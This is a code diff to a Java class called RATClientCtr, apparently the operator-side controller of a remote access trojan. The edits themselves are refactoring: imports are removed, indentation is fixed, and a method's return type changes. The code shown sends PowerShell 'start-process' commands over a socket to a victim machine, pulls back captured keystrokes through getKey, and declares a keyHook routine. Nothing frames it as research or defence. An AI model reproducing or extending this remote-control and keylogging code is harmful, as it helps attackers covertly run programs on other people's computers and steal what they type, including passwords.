@@ -7,10 +7,8 @@ import java.io.DataOutputStream;
 import java.io.File;
 import java.io.IOException;
 import java.io.InputStream;
-import java.io.ObjectInputStream;
 import java.io.OutputStream;
 import java.net.Socket;
-import java.nio.ByteBuffer;
 import java.util.ArrayList;
 import javax.imageio.ImageIO;
 
@@ -41,6 +39,7 @@ public class RATClientCtr {
         }
         return res;
     }
+    
     
     public static void getCommandRes(ArrayList<String> data) throws IOException {
         InputStream ips = mySocket.getInputStream();
@@ -98,11 +97,11 @@ public class RATClientCtr {
     }
     
     public static void StartApp(String name) throws IOException {
-    String command = "powershell.exe start-process " + name + ".exe ";
-    OutputStream ops = mySocket.getOutputStream();
-    DataOutputStream dos = new DataOutputStream(ops);
-    dos.writeUTF(command);
-    dos.flush();
+        String command = "powershell.exe start-process " + name + ".exe ";
+        OutputStream ops = mySocket.getOutputStream();
+        DataOutputStream dos = new DataOutputStream(ops);
+        dos.writeUTF(command);
+        dos.flush();
     }
     
     public static void Process() throws IOException {
@@ -136,7 +135,7 @@ public class RATClientCtr {
         }
     }
     
-    public static void getKey(ArrayList<Character> key) throws IOException {
+    public static String getKey(ArrayList<Character> key) throws IOException {
         String command = "Get";
         OutputStream ops = mySocket.getOutputStream();
         DataOutputStream dos = new DataOutputStream(ops);
@@ -156,9 +155,11 @@ public class RATClientCtr {
             for (int i = 0; i < numline; i++){
                 key.add((char)dis.readInt());
             }
+            return input;
         }catch (Exception e) {
             e.printStackTrace();
         }
+        return null;
     }
     
     public static void keyHook() throws IOException {
